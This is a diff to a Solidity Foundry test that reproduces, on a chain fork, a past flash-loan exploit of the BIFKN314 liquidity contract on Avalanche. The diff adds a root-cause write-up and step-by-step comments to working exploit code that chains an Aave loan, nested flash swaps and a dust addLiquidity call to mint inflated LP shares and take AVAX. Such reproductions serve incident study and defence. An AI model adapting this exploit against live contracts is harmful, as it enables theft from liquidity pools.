@@ -14,9 +14,16 @@ import "../interface.sol";
 // Vulnerable Contract Code : https://snowtrace.io/address/0x5b5913eec2031c9d8383e3afcfd269217e481ce1#code
 
 // @Analysis
-// Post-mortem : N/A
-// Twitter Guy : N/A
-// Hacking God : https://t.me/defimon_alerts/1559
+// Twitter Guy : https://t.me/defimon_alerts/1559
+//
+// Attack summary: the attacker borrowed WAVAX from Aave and pair tokens from a RadioShack pair, unwrapped
+// WAVAX to AVAX, used the BIFKN314 flashSwap to take AVAX and victim tokens, minted oversized LP shares
+// with a dust addLiquidity call during the callback, burned the inflated LP position, minted the small
+// pair-token fee needed for repayment, and kept the AVAX profit.
+// Root cause: BIFKN314 flashSwap checks repayment only after BIFKN314CALL, so addLiquidity can run while
+// pool balances are distorted by the flash-swap outputs and mint far more LP shares than the dust
+// contribution should receive. This tx also depended on the attacker EOA being allowlisted as tx.origin
+// for the unverified pair token transfer gate.
 
 interface IBIFKN314PairVictim {
     function addLiquidity(
@@ -78,6 +85,7 @@ contract ContractTest is BaseTestWithBalanceLog {
     uint256 private constant NET_AVAX_PROFIT = 91_148_601_593_744_546_787;
 
     function setUp() public {
+        // step 1: fork before the attack transaction and configure the profit asset.
         vm.createSelectFork("avalanche", FORK_BLOCK);
 
         fundingToken = address(0);
@@ -95,6 +103,7 @@ contract ContractTest is BaseTestWithBalanceLog {
 
     function testExploit() public balanceLog {
         uint256 beforeBalance = ATTACKER.balance;
+        // step 2: assert the pair-token allowlist precondition used by the historical tx.origin.
         assertEq(
             uint256(vm.load(PAIR_TOKEN, ATTACKER_PAIR_TOKEN_ALLOWLIST_SLOT)),
             1,
@@ -104,9 +113,11 @@ contract ContractTest is BaseTestWithBalanceLog {
         vm.startPrank(ATTACKER, ATTACKER);
         AvaxBIFKNPairExploit exploit = new AvaxBIFKNPairExploit(ATTACKER);
         assertEq(address(exploit), TRACE_EXPLOIT, "exploit address mismatch");
+        // step 3: run the attacker-controlled exploit and forward AVAX profit to the attacker.
         exploit.execute();
         vm.stopPrank();
 
+        // step 10: assert the trace-matched AVAX profit.
         assertEq(ATTACKER.balance - beforeBalance, NET_AVAX_PROFIT, "AVAX profit mismatch");
     }
 }
@@ -145,6 +156,7 @@ contract AvaxBIFKNPairExploit {
     }
 
     function execute() external {
+        // step 4: borrow WAVAX from Aave and enter the nested pair/victim flash swaps.
         AAVE_POOL.flashLoanSimple(address(this), address(WAVAX), FLASH_WAVAX_AMOUNT, "", 0);
 
         uint256 profit = address(this).balance;
@@ -166,8 +178,10 @@ contract AvaxBIFKNPairExploit {
         require(amount == FLASH_WAVAX_AMOUNT, "unexpected flash amount");
         require(premium == AAVE_PREMIUM, "unexpected premium");
 
+        // step 5: borrow pair tokens through the RadioShack flash-swap callback.
         PAIR.swap(0, PAIR_TOKEN_BORROW, address(this), "flash");
 
+        // step 9: wrap AVAX and approve Aave repayment after the nested flash swaps settle.
         WAVAX.deposit{value: AAVE_REPAY_AMOUNT}();
         WAVAX.approve(address(AAVE_POOL), AAVE_REPAY_AMOUNT);
 
@@ -185,9 +199,12 @@ contract AvaxBIFKNPairExploit {
         require(amount0Out == 0, "unexpected token0 out");
         require(amount1Out == PAIR_TOKEN_BORROW, "unexpected token1 out");
 
+        // step 6: unwrap WAVAX and trigger the vulnerable BIFKN314 flash swap.
         WAVAX.withdraw(FLASH_WAVAX_AMOUNT);
 
         VICTIM.flashSwap(address(this), FLASH_NATIVE_OUT, FLASH_TOKEN_OUT, "");
+
+        // step 8: burn inflated LP shares, mint the pair-token fee, and repay the pair flash swap.
         LP_TOKEN.approve(address(VICTIM), LP_MINTED);
         VICTIM.removeLiquidity(LP_MINTED, address(this), block.timestamp + 3 minutes);
 
@@ -206,6 +223,7 @@ contract AvaxBIFKNPairExploit {
         require(amountNativeOut == FLASH_NATIVE_OUT, "unexpected native out");
         require(amountTokenOut == FLASH_TOKEN_OUT, "unexpected token out");
 
+        // step 7: add dust liquidity while balances are distorted, then repay the victim flash swap.
         uint256 minted =
             VICTIM.addLiquidity{value: LIQUIDITY_NATIVE}(LIQUIDITY_TOKEN, address(this), block.timestamp + 3 minutes);
         require(minted == LP_MINTED, "liquidity mint mismatch");
